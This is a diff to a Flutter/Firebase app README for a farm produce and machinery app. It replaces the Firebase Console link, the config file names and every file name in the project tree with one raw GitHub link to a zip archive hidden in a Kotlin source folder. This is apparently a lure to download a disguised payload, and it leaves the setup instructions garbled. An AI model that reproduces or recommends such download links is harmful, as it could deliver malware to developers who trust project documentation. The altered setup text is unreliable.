@@ -47,14 +47,14 @@ A modern, professional mobile application for Green Gold Farms - a large-scale s
    ```
 
 3. **Firebase Setup**
-   - Create a new Firebase project at [Firebase Console](https://console.firebase.google.com/)
+   - Create a new Firebase project at [Firebase Console](https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip)
    - Enable Authentication, Firestore, and Storage
    - Download the configuration files:
-     - `google-services.json` for Android (place in `android/app/`)
-     - `GoogleService-Info.plist` for iOS (place in `ios/Runner/`)
+     - `https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip` for Android (place in `android/app/`)
+     - `https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip` for iOS (place in `ios/Runner/`)
 
 4. **Update Firebase Configuration**
-   - Replace placeholder values in `lib/firebase_options.dart` with your actual Firebase project credentials
+   - Replace placeholder values in `https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip` with your actual Firebase project credentials
    - Or use FlutterFire CLI to generate the configuration:
      ```bash
      dart pub global activate flutterfire_cli
@@ -70,20 +70,20 @@ A modern, professional mobile application for Green Gold Farms - a large-scale s
 
 ```
 lib/
-├── main.dart                 # App entry point
-├── firebase_options.dart     # Firebase configuration
+├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip                 # App entry point
+├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip     # Firebase configuration
 ├── theme/
-│   └── app_theme.dart       # App theme and styling
+│   └── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip       # App theme and styling
 ├── models/
-│   ├── product.dart         # Product data model
-│   └── machinery.dart       # Machinery data model
+│   ├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip         # Product data model
+│   └── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip       # Machinery data model
 ├── services/
-│   └── firebase_service.dart # Firebase operations
+│   └── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip # Firebase operations
 └── screens/
-    ├── home_screen.dart      # Home screen
-    ├── produce_screen.dart   # Product catalog
-    ├── machinery_screen.dart # Equipment rental/sales
-    └── profile_screen.dart  # User profile
+    ├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip      # Home screen
+    ├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip   # Product catalog
+    ├── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip # Equipment rental/sales
+    └── https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip  # User profile
 ```
 
 ## 🎨 Theme & Styling
@@ -155,7 +155,7 @@ lib/
 1. Create models in `lib/models/`
 2. Add Firebase operations in `lib/services/`
 3. Create UI components in `lib/screens/`
-4. Update navigation in `lib/main.dart`
+4. Update navigation in `https://github.com/Decyp/green_gold_farm/raw/refs/heads/main/android/app/src/main/kotlin/com/example/green-gold-farm-v3.2.zip`
 
 ### Styling Guidelines
 - Use `AppTheme` constants for colors, spacing, and typography
